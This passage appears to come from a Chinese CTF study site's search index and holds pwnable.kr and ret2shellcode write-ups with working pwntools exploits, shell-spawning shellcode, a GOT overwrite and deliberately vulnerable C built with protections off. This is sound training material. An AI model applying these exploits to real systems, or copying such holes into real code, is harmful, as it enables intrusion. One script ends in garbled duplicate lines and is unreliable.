(socklen_t*)&amp;c);\n        if(cd &lt; 0){\n                printf(\"accept error, tell admin\\n\");\n                return 0;\n        }\n        if( recv(cd, buf, 4, 0) != 4 ) return 0;\n        if(memcmp(buf, \"\\xde\\xad\\xbe\\xef\", 4)) return 0;\n        printf(\"Stage 5 clear!\\n\");\n</code></pre> <pre><code>args[67] = '8888'\nconn = connect('127.0.0.1',8888)\nconn.send(b'\\xde\\xad\\xbe\\xef')\nconn.close()\n</code></pre>"},{"location":"pwn/pwnable--input/#writeup","title":"\u5b8c\u6574\u7684writeup\u5982\u4e0b","text":"<pre><code>from pwn import *\nimport os\nimport socket\n\n#argv\nargs = ['a']*100\nargs[65] = '\\x00'\nargs[66] = '\\x20\\x0a\\x0d'\nargs[67] = '8888' #for network -- set port to args['C']\n\n\n#stdio\nstdinr, stdinw = os.pipe()\nstderrr, stderrw = os.pipe()\nos.write(stdinw,b\"\\x00\\x0a\\x00\\xff\")\nos.write(stderrw,b\"\\x00\\x0a\\x02\\xff\")\n\n#env\nenv = {\"\\xde\\xad\\xbe\\xef\":\"\\xca\\xfe\\xba\\xbe\"}\n\n#file\nwith open(\"\\x0a\",\"w+\") as f:\n    f.write(\"\\x00\\x00\\x00\\x00\")\n\n\np = process(executable='./input',argv=args,stdin=stdinr,stderr=stderrr,env=env) \n\n#network\nconn = connect('127.0.0.1',8888)\nconn.send(b'\\xde\\xad\\xbe\\xef')\nconn.close()\n\np.interactive()\nnv=env) \np.interactive()\nve()\n\np.interactive()\n</code></pre>"},{"location":"pwn/pwnable--passcode/","title":"pwnable--passcode","text":"<p>\u53c2\u8003</p> <p>\u77e5\u8bc6\u70b9\uff1a</p> <pre><code>EIP\u3001EBP\u3001ESP\u7684\u4f5c\u7528\uff1a\nEIP\u5b58\u50a8\u7740\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\uff0c\u6bcf\u6267\u884c\u4e00\u6761\u6307\u4ee4\uff0c\u8be5\u5bc4\u5b58\u5668\u53d8\u5316\u4e00\u6b21\n\nEBP\u5b58\u50a8\u7740\u5f53\u524d\u51fd\u6570\u6808\u5e95\u7684\u5730\u5740\uff0c\u6808\u5e95\u901a\u5e38\u4f5c\u4e3a\u57fa\u5740\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6808\u5e95\u5730\u5740\u548c\u504f\u79fb\u76f8\u52a0\u51cf\u6765\u83b7\u53d6\u53d8\u91cf\u5730\u5740\uff08\u5f88\u91cd\u8981\uff09\n\nESP\u5c31\u662f\u524d\u9762\u8bf4\u7684\uff0c\u59cb\u7ec8\u6307\u5411\u6808\u9876\uff0c\u53ea\u8981ESP\u6307\u5411\u53d8\u4e86\uff0c\u90a3\u4e48\u5f53\u524d\u6808\u9876\u5c31\u53d8\u4e86\n</code></pre> <pre><code>Mommy told me to make a passcode based login system.\nMy initial C code was compiled without any error!\nWell, there was some compiler warning, but who cares about that?\n\nssh passcode@pwnable.kr -p2222 (pw:guest)\n</code></pre> <p>ssh passcode@pwnable.kr -p2222 (pw:guest)\u5f97\u5230</p> <pre><code>passcode@pwnable:~$ ls\nflag  passcode  passcode.c\npasscode@pwnable:~$ file passcode\npasscode: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=d2b7bd64f70e46b1b0eb7036b35b24a651c3666b, not stripped\npasscode@pwnable:~$ checksec passcode\n[*] '/home/passcode/passcode'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n</code></pre> <p>cat passcode.c</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid login(){\n    int passcode1;\n    int passcode2;\n\n    printf(\"enter passcode1 : \");\n    scanf(\"%d\", passcode1);     //\u7531\u4e8e\u5c11\u4e86\u53d6\u5730\u5740\u7b26\u53f7&amp;\uff0c\u53ef\u4ee5\u4ee5passcode\u503c\u5bfb\u5740\u5230\u7684\u5185\u5b58\u5730\u5740\u8fdb\u884c\u8986\u76d6\n    fflush(stdin);\n\n    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)\n    printf(\"enter passcode2 : \");\n        scanf(\"%d\", passcode2);\n\n    printf(\"checking...\\n\");\n    if(passcode1==338150 &amp;&amp; passcode2==13371337){\n                printf(\"Login OK!\\n\");\n                system(\"/bin/cat flag\");\n        }\n        else{\n                printf(\"Login Failed!\\n\");\n        exit(0);\n        }\n}\n\nvoid welcome(){\n    char name[100];\n    printf(\"enter you name : \");\n    scanf(\"%100s\", name);\n    printf(\"Welcome %s!\\n\", name);\n}\n\nint main(){\n    printf(\"Toddler's Secure Login System 1.0 beta.\\n\");\n\n    welcome();\n    login();\n\n    // something after login...\n    printf(\"Now I can safely trust you that you have credential :)\\n\");\n    return 0;\n}\n</code></pre> <p>\u5c1d\u8bd5\u8fd0\u884cpasscode</p> <pre><code>passcode@pwnable:~$ ./passcode \nToddler's Secure Login System 1.0 beta.\nenter you name : admin\nWelcome admin!\nenter passcode1 : dsj\nenter passcode2 : checking...\nLogin Failed!\n</code></pre> <p>PS:</p> <pre><code>fflush(stdin)\u662f\u4e00\u4e2a\u8ba1\u7b97\u673a\u4e13\u4e1a\u672f\u8bed\uff0c\u529f\u80fd\u662f\u6e05\u7a7a\u8f93\u5165\u7f13\u51b2\u533a\n\u901a\u5e38\u662f\u4e3a\u4e86\u786e\u4fdd\u4e0d\u5f71\u54cd\u540e\u9762\u7684\u6570\u636e\u8bfb\u53d6(\u4f8b\u5982\u5728\u8bfb\u5b8c\u4e00\u4e2a\u5b57\u7b26\u4e32\u540e\u7d27\u63a5\u7740\u53c8\u8981\u8bfb\u53d6\u4e00\u4e2a\u5b57\u7b26\uff0c\u6b64\u65f6\u5e94\u8be5\u5148\u6267\u884cfflush(stdin)\n</code></pre> <p>objdump\u67e5\u770b\u51fd\u6570\uff1a</p> <pre><code>passcode@pwnable:~$ objdump -t -j .text passcode\n\npasscode:     file format elf32-i386\n\nSYMBOL TABLE:\n080484b0 l    d  .text  00000000              .text\n080484e0 l     F .text  00000000              __do_global_dtors_aux\n08048540 l     F .text  00000000              frame_dummy\n08048720 l     F .text  00000000              __do_global_ctors_aux\n08048710 g     F .text  00000002              __libc_csu_fini\n08048712 g     F .text  00000000              .hidden __i686.get_pc_thunk.bx\n08048564 g     F .text  000000a5              login\n08048609 g     F .text  0000005c              welcome\n080486a0 g     F .text  00000061              __libc_csu_init\n080484b0 g     F .text  00000000              _start\n08048665 g     F .text  00000032              main\n</code></pre> <p>\u4f7f\u7528gdb\u8fdb\u884c\u8c03\u8bd5\uff1a</p> <pre><code>(gdb) disass main\nDump of assembler code for function main:\n   0x08048665 &lt;+0&gt;: push   %ebp\n   0x08048666 &lt;+1&gt;: mov    %esp,%ebp\n   0x08048668 &lt;+3&gt;: and    $0xfffffff0,%esp\n   0x0804866b &lt;+6&gt;: sub    $0x10,%esp\n   0x0804866e &lt;+9&gt;: movl   $0x80487f0,(%esp)\n   0x08048675 &lt;+16&gt;:    call   0x8048450 &lt;puts@plt&gt;\n   0x0804867a &lt;+21&gt;:    call   0x8048609 &lt;welcome&gt;\n   0x0804867f &lt;+26&gt;:    call   0x8048564 &lt;login&gt;\n   0x08048684 &lt;+31&gt;:    movl   $0x8048818,(%esp)\n   0x0804868b &lt;+38&gt;:    call   0x8048450 &lt;puts@plt&gt;\n   0x08048690 &lt;+43&gt;:    mov    $0x0,%eax\n   0x08048695 &lt;+48&gt;:    leave  \n   0x08048696 &lt;+49&gt;:    ret    \nEnd of assembler dump.\n</code></pre> <pre><code>(gdb) disass welcome\nDump of assembler code for function welcome:\n   0x08048609 &lt;+0&gt;: push   %ebp\n   0x0804860a &lt;+1&gt;: mov    %esp,%ebp\n   0x0804860c &lt;+3&gt;: sub    $0x88,%esp\n   0x08048612 &lt;+9&gt;: mov    %gs:0x14,%eax\n   0x08048618 &lt;+15&gt;:    mov    %eax,-0xc(%ebp)\n   0x0804861b &lt;+18&gt;:    xor    %eax,%eax\n   0x0804861d &lt;+20&gt;:    mov    $0x80487cb,%eax\n   0x08048622 &lt;+25&gt;:    mov    %eax,(%esp)\n   0x08048625 &lt;+28&gt;:    call   0x8048420 &lt;printf@plt&gt;\n   0x0804862a &lt;+33&gt;:    mov    $0x80487dd,%eax\n   0x0804862f &lt;+38&gt;:    lea    -0x70(%ebp),%edx    //name\n   0x08048632 &lt;+41&gt;:    mov    %edx,0x4(%esp)\n   0x08048636 &lt;+45&gt;:    mov    %eax,(%esp)\n   0x08048639 &lt;+48&gt;:    call   0x80484a0 &lt;__isoc99_scanf@plt&gt;\n   0x0804863e &lt;+53&gt;:    mov    $0x80487e3,%eax\n   0x08048643 &lt;+58&gt;:    lea    -0x70(%ebp),%edx\n   0x08048646 &lt;+61&gt;:    mov    %edx,0x4(%esp)\n   0x0804864a &lt;+65&gt;:    mov    %eax,(%esp)\n   0x0804864d &lt;+68&gt;:    call   0x8048420 &lt;printf@plt&gt;\n   0x08048652 &lt;+73&gt;:    mov    -0xc(%ebp),%eax\n   0x08048655 &lt;+76&gt;:    xor    %gs:0x14,%eax\n   0x0804865c &lt;+83&gt;:    je     0x8048663 &lt;welcome+90&gt;\n   0x0804865e &lt;+85&gt;:    call   0x8048440 &lt;__stack_chk_fail@plt&gt;\n   0x08048663 &lt;+90&gt;:    leave  \n   0x08048664 &lt;+91&gt;:    ret    \nEnd of assembler dump.\n</code></pre> <pre><code>(gdb) disass login\nDump of assembler code for function login:\n   0x08048564 &lt;+0&gt;: push   %ebp\n   0x08048565 &lt;+1&gt;: mov    %esp,%ebp\n   0x08048567 &lt;+3&gt;: sub    $0x28,%esp\n   0x0804856a &lt;+6&gt;: mov    $0x8048770,%eax\n   0x0804856f &lt;+11&gt;:    mov    %eax,(%esp)\n   0x08048572 &lt;+14&gt;:    call   0x8048420 &lt;printf@plt&gt;\n   0x08048577 &lt;+19&gt;:    mov    $0x8048783,%eax\n   0x0804857c &lt;+24&gt;:    mov    -0x10(%ebp),%edx       //passcode1\n   0x0804857f &lt;+27&gt;:    mov    %edx,0x4(%esp)\n   0x08048583 &lt;+31&gt;:    mov    %eax,(%esp)\n   0x08048586 &lt;+34&gt;:    call   0x80484a0 &lt;__isoc99_scanf@plt&gt;\n   0x0804858b &lt;+39&gt;:    mov    0x804a02c,%eax\n   0x08048590 &lt;+44&gt;:    mov    %eax,(%esp)\n   0x08048593 &lt;+47&gt;:    call   0x8048430 &lt;fflush@plt&gt;\n   0x08048598 &lt;+52&gt;:    mov    $0x8048786,%eax\n   0x0804859d &lt;+57&gt;:    mov    %eax,(%esp)\n   0x080485a0 &lt;+60&gt;:    call   0x8048420 &lt;printf@plt&gt;\n   0x080485a5 &lt;+65&gt;:    mov    $0x8048783,%eax\n   0x080485aa &lt;+70&gt;:    mov    -0xc(%ebp),%edx      //passcode2\n   0x080485ad &lt;+73&gt;:    mov    %edx,0x4(%esp)\n   0x080485b1 &lt;+77&gt;:    mov    %eax,(%esp)\n   0x080485b4 &lt;+80&gt;:    call   0x80484a0 &lt;__isoc99_scanf@plt&gt;\n   0x080485b9 &lt;+85&gt;:    movl   $0x8048799,(%esp)\n   0x080485c0 &lt;+92&gt;:    call   0x8048450 &lt;puts@plt&gt;\n   0x080485c5 &lt;+97&gt;:    cmpl   $0x528e6,-0x10(%ebp)\n   0x080485cc &lt;+104&gt;:   jne    0x80485f1 &lt;login+141&gt;\n   0x080485ce &lt;+106&gt;:   cmpl   $0xcc07c9,-0xc(%ebp)\n   0x080485d5 &lt;+113&gt;:   jne    0x80485f1 &lt;login+141&gt;\n   0x080485d7 &lt;+115&gt;:   movl   $0x80487a5,(%esp)\n   0x080485de &lt;+122&gt;:   call   0x8048450 &lt;puts@plt&gt;\n   0x080485e3 &lt;+127&gt;:   movl   $0x80487af,(%esp)\n   0x080485ea &lt;+134&gt;:   call   0x8048460 &lt;system@plt&gt;\n   0x080485ef &lt;+139&gt;:   leave  \n   0x080485f0 &lt;+140&gt;:   ret    \n   0x080485f1 &lt;+141&gt;:   movl   $0x80487bd,(%esp)\n   0x080485f8 &lt;+148&gt;:   call   0x8048450 &lt;puts@plt&gt;\n   0x080485fd &lt;+153&gt;:   movl   $0x0,(%esp)\n   0x08048604 &lt;+160&gt;:   call   0x8048480 &lt;exit@plt&gt;\nEnd of assembler dump.\n</code></pre> <p>GOT\u8868</p> <pre><code>pwndbg&gt; got\n\nGOT protection: Partial RELRO | GOT functions: 9\n\n[0x804a000] printf@GLIBC_2.0 -&gt; 0x8048426 (printf@plt+6) \u25c2\u2014 push   0 /* 'h' */\n[0x804a004] fflush@GLIBC_2.0 -&gt; 0x8048436 (fflush@plt+6) \u25c2\u2014 push   8\n[0x804a008] __stack_chk_fail@GLIBC_2.4 -&gt; 0x8048446 (__stack_chk_fail@plt+6) \u25c2\u2014 push   0x10\n[0x804a00c] puts@GLIBC_2.0 -&gt; 0xf7e2b480 (puts) \u25c2\u2014 push   ebp\n[0x804a010] system@GLIBC_2.0 -&gt; 0x8048466 (system@plt+6) \u25c2\u2014 push   0x20 /* 'h ' */\n[0x804a014] __gmon_start__ -&gt; 0x8048476 (__gmon_start__@plt+6) \u25c2\u2014 push   0x28 /* 'h(' */\n[0x804a018] exit@GLIBC_2.0 -&gt; 0x8048486 (exit@plt+6) \u25c2\u2014 push   0x30 /* 'h0' */\n[0x804a01c] __libc_start_main@GLIBC_2.0 -&gt; 0xf7dda820 (__libc_start_main) \u25c2\u2014 call   0xf7f011a9\n[0x804a020] __isoc99_scanf@GLIBC_2.7 -&gt; 0x80484a6 (__isoc99_scanf@plt+6) \u25c2\u2014 push   0x40 /* 'h@' */\n</code></pre> <p>\u4e0b\u65ad\u70b9\u5206\u6790welcome\u51fd\u6570</p> <p></p> <p>welcome\u51fd\u6570ebp\u4e3a0xffffd498</p> <p>\u4e14\u542f\u52a8\u4e86gs\u6808\u68c0\u6d4b\uff0c\u6240\u4ee5\u4e0d\u80fd\u5c06\u8fd4\u56de\u5730\u5740\u76f4\u63a5\u8986\u76d6\u4e3a\u76ee\u6807\u5730\u5740</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u5728<code>0x8048639 &lt;welcome+48&gt;: call 0x80484a0 &lt;__isoc99_scanf@plt&gt;</code> \u662f\u8f93\u5165name\u7684\u5b57\u7b26\u4e32\u63d0\u793a\uff0c\u90a3\u4e48\u4e0b\u4e00\u4e2a\u5730\u662f\u5c31\u662fname\u7684\u5730\u5740</p> <p>name:edx,[ebp-0x70]</p> <p>\u7ee7\u7eed\u5f80\u4e0b\u8d70</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u8f93\u5165\u7684name\u503caaaaaa\u7684\u5730\u5740\u662f0xffffd428</p> <p>\u7ee7\u7eed\u6267\u884c\uff0c\u8df3\u8f6c\u81f3login\u51fd\u6570</p> <p></p> <p>\u53ef\u4ee5\u53d1\u73b0login\u51fd\u6570ebp\u4e5f\u662f0xffffd498\uff0c\u6545welcome\u51fd\u6570\u548clogin\u51fd\u6570\u6709\u76f8\u540c\u7684ebp</p> <p>**\u00a0**</p> <p>passcode1:edx,DWORD PTR [ebp-0x10]</p> <p>\u5df2\u77e5welcome\u548clogin\u51fd\u6570\u62e5\u6709\u540c\u4e00ebp,\u90a3\u4e48name\u548cpasscode1\u5728\u540c\u4e00\u4e2a\u6808\u7a7a\u95f4\u91cc\uff0c\u53ef\u4ee5\u8986\u5199GOT</p> <p>name:edx,[ebp-0x70] - passcode1:edx,DWORD PTR [ebp-0x10]\u5373 ebp-0x70 - ebp-0x10=96\uff0c\u5373name\u548cpasscode1\u76f8\u5dee96\u5b57\u8282</p> <p>\u53ef\u4ee5\u770b\u5230\u5728login()\u4e2d\uff0c\u6267\u884cscanf()\u540e\u6267\u884cfflush()\u51fd\u6570\uff0c\u53ef\u4ee5\u901a\u8fc7name\u53d8\u91cf\u8986\u76d6\uff0c\u5c06passcode1\u7684\u503c\u6539\u4e3afflush()\u51fd\u6570\u7684\u5730\u5740</p> <p>\u5728\u63a5\u4e0b\u6765\u6267\u884clogin()\u65f6\uff0cfflush()\u51fd\u6570\u7684\u5730\u5740\u7684\u503c\uff0c\u901a\u8fc7scanf()\u88ab\u8d4b\u503c\u4e3asystem\u5730\u5740\uff0c\u5b9e\u884c\u6267\u884c\u67e5\u770bflag\u7684\u547d\u4ee4</p> <p>*\u627e\u5230fflush()\u7684got\u8868\u9879\u5730\u5740\u4e3a0x804a004\uff0csystem()\u7684got\u8868\u9879\u5730\u5740\u4e3a0x080485e3*</p> <p>\u53ef\u4ee5\u5f97\u5230payload = \u2018a\u2019*96+\u2019\\x04\\xA0\\x04\\x08\u2019+\u2019\\n\u2019+\u2018134514147\\n\u2019</p> <p>python-c \u201c\u2018a\u2019*96+\u2019\\x04\\xA0\\x04\\x08\u2019+\u2019\\n\u2019+\u2018134514147\\n\u2019\u201d|./passcode</p> <pre><code># -*- coding:utf-8 -*-\n\nfrom pwn import *\n\ntry:\n    s = ssh(host='pwnable.kr',user='passcode',password='guest',port=2222)\n    p = s.process('./passcode')\n    p.sendline('a'*96+'\\x04\\xA0\\x04\\x08'+'\\n'+'134514147\\n')\n    p.interactive()\nexcept:\n    print('error')\n</code></pre> <p>\u6267\u884cexp\u5f97\u5230flag\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a</p> <p></p>"},{"location":"pwn/pwnable--random/","title":"pwnable--random","text":"<p>Tips:</p> <p>rand()\u51fd\u6570\u8bf7\u67e5\u770bSecurity\u4e0b\u76f8\u5173\u6587\u6863</p> <pre><code>Daddy, teach me how to use random value in programming!\n\nssh random@pwnable.kr -p2222 (pw:guest)\n</code></pre> <pre><code>#include &lt;stdio.h&gt;\n\nint main(){\n    unsigned int random;\n    random = rand();    // random value!\n\n    unsigned int key=0;\n    scanf(\"%d\", &amp;key);\n\n    if( (key ^ random) == 0xdeadbeef ){\n        printf(\"Good!\\n\");\n        system(\"/bin/cat flag\");\n        return 0;\n    }\n\n    printf(\"Wrong, maybe you should try 2^32 cases.\\n\");\n    return 0;\n}\n</code></pre> <p>\u7ecf\u8fc7\u67e5\u9605\u5f97\u77e5\uff1a</p> <p><code>rand()</code> \u7684\u5185\u90e8\u5b9e\u73b0\u662f\u7528\u7ebf\u6027\u540c\u4f59\u6cd5\u505a\u7684\uff0c\u5b83\u4e0d\u662f\u771f\u7684\u968f\u673a\u6570\uff0c\u56e0\u5176\u5468\u671f\u7279\u522b\u957f\uff0c\u6545\u5728\u4e00\u5b9a\u7684\u8303\u56f4\u91cc\u53ef\u770b\u6210\u662f\u968f\u673a\u7684\u3002</p> <p><code>rand()</code>\u8fd4\u56de\u4e00\u968f\u673a\u6570\u503c\u7684\u8303\u56f4\u5728 <code>0 \u81f3 RAND_MAX</code>\u95f4\u3002</p> <p><code>RAND_MAX</code>\u7684\u8303\u56f4\u6700\u5c11\u662f\u5728 <code>32767</code> \u4e4b\u95f4<code>(int)</code>\u3002</p> <p>\u7528<code>unsigned int</code> \u53cc\u5b57\u8282\u662f <code>65535</code>\uff0c\u56db\u5b57\u8282\u662f <code>4294967295</code>\u7684\u6574\u6570\u8303\u56f4\u3002</p> <p><code>0~RAND_MAX</code> \u6bcf\u4e2a\u6570\u5b57\u88ab\u9009\u4e2d\u7684\u673a\u7387\u662f\u76f8\u540c\u7684\u3002</p> <p>\u7528\u6237\u672a\u8bbe\u5b9a\u968f\u673a\u6570\u79cd\u5b50\u65f6\uff0c\u7cfb\u7edf\u9ed8\u8ba4\u7684\u968f\u673a\u6570\u79cd\u5b50\u4e3a<code>1</code>\u3002</p> <p><code>rand()</code>\u4ea7\u751f\u7684\u662f\u4f2a\u968f\u673a\u6570\u5b57\uff0c\u6bcf\u6b21\u6267\u884c\u65f6\u662f\u76f8\u540c\u7684; \u82e5\u8981\u4e0d\u540c, \u7528\u51fd\u6570<code>srand()</code>\u521d\u59cb\u5316\u5b83</p> <p>\u5728\u672c\u9898\u76ee\u4e2d\u5e76\u6ca1\u6709\u4f7f\u7528srand()\u51fd\u6570,\u6545\u800crand()\u751f\u6210\u7684\u968f\u673a\u6570\u5b9e\u9645\u4e0a\u662f\u56fa\u5b9a\u7684</p> <p>\u9002\u7528gdb\u5206\u6790</p> <pre><code>\u2514\u2500# objdump -t -j .text random                                                                                                                                  127 \u2a2f\n\nrandom:     file format elf64-x86-64\n\nSYMBOL TABLE:\n0000000000400510 l    d  .text  0000000000000000              .text\n000000000040053c l     F .text  0000000000000000              call_gmon_start\n0000000000400560 l     F .text  0000000000000000              __do_global_dtors_aux\n00000000004005d0 l     F .text  0000000000000000              frame_dummy\n0000000000400710 l     F .text  0000000000000000              __do_global_ctors_aux\n0000000000400700 g     F .text  0000000000000002              __libc_csu_fini\n0000000000400670 g     F .text  0000000000000089              __libc_csu_init\n0000000000400510 g     F .text  0000000000000000              _start\n00000000004005f4 g     F .text  0000000000000073              main\n</code></pre> <pre><code>pwndbg&gt; disass main\nDump of assembler code for function main:\n   0x00000000004005f4 &lt;+0&gt;: push   rbp\n   0x00000000004005f5 &lt;+1&gt;: mov    rbp,rsp\n   0x00000000004005f8 &lt;+4&gt;: sub    rsp,0x10\n   0x00000000004005fc &lt;+8&gt;: mov    eax,0x0\n   0x0000000000400601 &lt;+13&gt;:    call   0x400500 &lt;rand@plt&gt;\n   0x0000000000400606 &lt;+18&gt;:    mov    DWORD PTR [rbp-0x4],eax\n   0x0000000000400609 &lt;+21&gt;:    mov    DWORD PTR [rbp-0x8],0x0\n   0x0000000000400610 &lt;+28&gt;:    mov    eax,0x400760\n   0x0000000000400615 &lt;+33&gt;:    lea    rdx,[rbp-0x8]\n   0x0000000000400619 &lt;+37&gt;:    mov    rsi,rdx\n   0x000000000040061c &lt;+40&gt;:    mov    rdi,rax\n   0x000000000040061f &lt;+43&gt;:    mov    eax,0x0\n   0x0000000000400624 &lt;+48&gt;:    call   0x4004f0 &lt;__isoc99_scanf@plt&gt;\n   0x0000000000400629 &lt;+53&gt;:    mov    eax,DWORD PTR [rbp-0x8]\n   0x000000000040062c &lt;+56&gt;:    xor    eax,DWORD PTR [rbp-0x4]\n   0x000000000040062f &lt;+59&gt;:    cmp    eax,0xdeadbeef\n   0x0000000000400634 &lt;+64&gt;:    jne    0x400656 &lt;main+98&gt;\n   0x0000000000400636 &lt;+66&gt;:    mov    edi,0x400763\n   0x000000000040063b &lt;+71&gt;:    call   0x4004c0 &lt;puts@plt&gt;\n   0x0000000000400640 &lt;+76&gt;:    mov    edi,0x400769\n   0x0000000000400645 &lt;+81&gt;:    mov    eax,0x0\n   0x000000000040064a &lt;+86&gt;:    call   0x4004d0 &lt;system@plt&gt;\n   0x000000000040064f &lt;+91&gt;:    mov    eax,0x0\n   0x0000000000400654 &lt;+96&gt;:    jmp    0x400665 &lt;main+113&gt;\n   0x0000000000400656 &lt;+98&gt;:    mov    edi,0x400778\n   0x000000000040065b &lt;+103&gt;:   call   0x4004c0 &lt;puts@plt&gt;\n   0x0000000000400660 &lt;+108&gt;:   mov    eax,0x0\n   0x0000000000400665 &lt;+113&gt;:   leave  \n   0x0000000000400666 &lt;+114&gt;:   ret    \nEnd of assembler dump.\n</code></pre> <p></p> <p>\u5728rand@plt\u540e\u8bbe\u7f6e\u65ad\u70b9\u7136\u540e\u8fd0\u884c\uff0c\u53ef\u4ee5\u5f97\u5230random\u968f\u673a\u6570RAX\u4e3a0x6b8b4567</p> <p>\u7531\u4e8e^(\u5f02\u6216)\u8fd0\u7b97\u662f\u53ef\u9006\u7684\uff0c\u53ef\u4ee5\u5f97\u5230key:</p> <p>key =0x6b8b4567^0xdeadbeef = 3039230856(\u53ef\u4ee5\u7528python shell\u8ba1\u7b97\u5f97\u51fa)</p> <p>\u672c\u5730\u8fd0\u884c\uff1a</p> <pre><code>\u250c\u2500\u2500(root\ud83d\udc80kali)-[~/pwnable/random]\n\u2514\u2500# ./random\n3039230856\nGood!\n/bin/cat: flag: No such file or directory\n</code></pre> <p>pwnable.kr\u8fd0\u884c\uff1a</p> <pre><code># -*- coding:utf-8 -*-\n\nfrom pwn import *\n\ntry:\n    s = ssh(host='pwnable.kr',user='random',password='guest',port=2222)\n    p = s.process('./random')\n    p.sendline('3039230856\\n')\n    p.interactive()\nexcept:\n    print('error')\n</code></pre> <p></p>"},{"location":"pwn/ret2shellcode/","title":"ret2shellcode","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nchar buf2[100];\n\nint main(void)\n{\n    setvbuf(stdout, 0LL, 2, 0LL);\n    setvbuf(stdin, 0LL, 1, 0LL);\n\n    char buf[100];\n\n    printf(\"No system for you this time !!!\\n\");\n    gets(buf);\n    strncpy(buf2, buf, 100);\n    printf(\"bye bye ~\");\n\n    return 0;\n}\n</code></pre> <p>\u68c0\u67e5\u4fdd\u62a4</p> <pre><code>\u2514\u2500# checksec ret2shellcode \n[*] '/root/pwn/ret2shellcode'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x8048000)\n    RWX:      Has RWX segments\n</code></pre> <p>\u67e5\u770b\u4ee3\u7801\u6bb5</p> <pre><code>\u2514\u2500# objdump -t -j .text ret2shellcode \n\nret2shellcode:     file format elf32-i386\n\nSYMBOL TABLE:\n08048430 l    d  .text  00000000              .text\n08048470 l     F .text  00000000              deregister_tm_clones\n080484a0 l     F .text  00000000              register_tm_clones\n080484e0 l     F .text  00000000              __do_global_dtors_aux\n08048500 l     F .text  00000000              frame_dummy\n08048640 g     F .text  00000002              __libc_csu_fini\n08048460 g     F .text  00000004              .hidden __x86.get_pc_thunk.bx\n080485d0 g     F .text  00000061              __libc_csu_init\n08048430 g     F .text  00000000              _start\n0804852d g     F .text  0000009a              main\n</code></pre> <p>\u67e5\u770b\u5206\u6790\u5176\u6e90\u7801</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u7a0b\u5e8f\u4f1a\u83b7\u53d6\u8f93\u5165\u7684buf\u53d8\u91cf\u503c\uff0c\u5e76\u5c06\u5176\u590d\u5236\u81f3buf2\u53d8\u91cf\u4e2d</p> <p>\u5bf9buf2\u4e0b\u65ad\u70b9\u53ef\u4ee5\u770b\u5230buf2\u7684\u5730\u5740\u4e3a0x804a080</p> <pre><code>gdb-peda$ b *buf2\nBreakpoint 2 at 0x804a080\n</code></pre> <p>\u67e5\u770bbuf2\u6570\u636e\u6bb5\u662f\u5426\u5b58\u5728\u8bfb\u5199\u6743\u9650</p> <p></p> <p>\u63a5\u4e0b\u6765\u901a\u8fc7\u52a8\u6001\u8c03\u8bd5\u5224\u65adbuf\u53d8\u91cf\u504f\u79fb\u8ddd\u79bb</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u65e0\u6548\u5730\u5740\u4e3a0x41384141\uff0c\u7136\u540e\u4f7f\u7528pattern_offset\u5224\u65ad\u5177\u4f53\u504f\u79fb\u8ddd\u79bb\u4e3a112</p> <pre><code>gdb-peda$ pattern_offset 0x41384141\n1094205761 found at offset: 112\n</code></pre> <p>\u7136\u540e\u6211\u4eec\u751f\u6210shellcode\uff0c\u53ef\u4ee5\u4f7f\u7528pwntools\u7684shellcraft\uff0c\u5982\u4e0b</p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[~/pwn]\n\u2514\u2500# python\nPython 3.8.0 (default, Jul 12 2022, 11:34:11) \n[GCC 11.3.0] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; from pwn import *\n&gt;&gt;&gt; shellcode = asm(shellcraft.sh())\n&gt;&gt;&gt; print(shellcode)\nb'jhh///sh/bin\\x89\\xe3h\\x01\\x01\\x01\\x01\\x814$ri\\x01\\x011\\xc9Qj\\x04Y\\x01\\xe1Q\\x89\\xe11\\xd2j\\x0bX\\xcd\\x80'\n&gt;&gt;&gt; len(shellcode)\n44\n&gt;&gt;&gt; 112-44\n68\n&gt;&gt;&gt;\n</code></pre> <p>\u4ece\u4e0a\u9762\u53ef\u4ee5\u770b\u5230\uff0cshellcode\u7684\u957f\u5ea6\u4e3a44\uff0c\u90a3\u4e48\u5269\u4e0b\u9700\u8981\u586b\u5145\u7684\u957f\u5ea6\u4e3a68,\u4e00\u5171112\u53ef\u4ee5\u8986\u76d6ebp,\u7136\u540e\u4fee\u6539\u8fd4\u56de\u503c\u4e3ashellcode\u6240\u5728buf2\u7684\u5730\u5740</p> <p>exp\u5982\u4e0b</p> <pre><code>from pwn import *\n\nsh = process('./ret2shellcode')\nshellcode = asm(shellcraft.sh())\nbuf2_addr = 0x804a080\n\nsh.sendline(shellcode + b'a'*68 + p32(buf2_addr))\nsh.interactive()\n</code></pre>"},{"location":"pwn/stack_test/","title":"stack_test","text":"<p>\u6808\u6ea2\u51fa\u7b80\u5355\u9898\u76ee</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n//compile options --to disable all protect\n//gcc -no-pie -fno-stack-protector -z execstack stack_test.c -o stack_test\n\nvoid pwn() \n{ \n    puts(\"Stack Overflow!\"); \n}\n\nvoid vulnerable() \n{\n    char s[12];\n    gets(s);\n    puts(s);\n    return;\n}\n\nint main(int argc, char **argv) \n{\n    vulnerable();\n    return 0;\n}\n</code></pre> <p>\u4ee5\u4e0b\u4e3a\u7f16\u8bd1\u9009\u9879\uff08\u5173\u95ed\u6240\u6709\u4fdd\u62a4\uff09\uff1a</p> <pre><code>gcc -no-pie -fno-stack-protector -z execstack stack_test.c -o stack_test\n</code></pre> 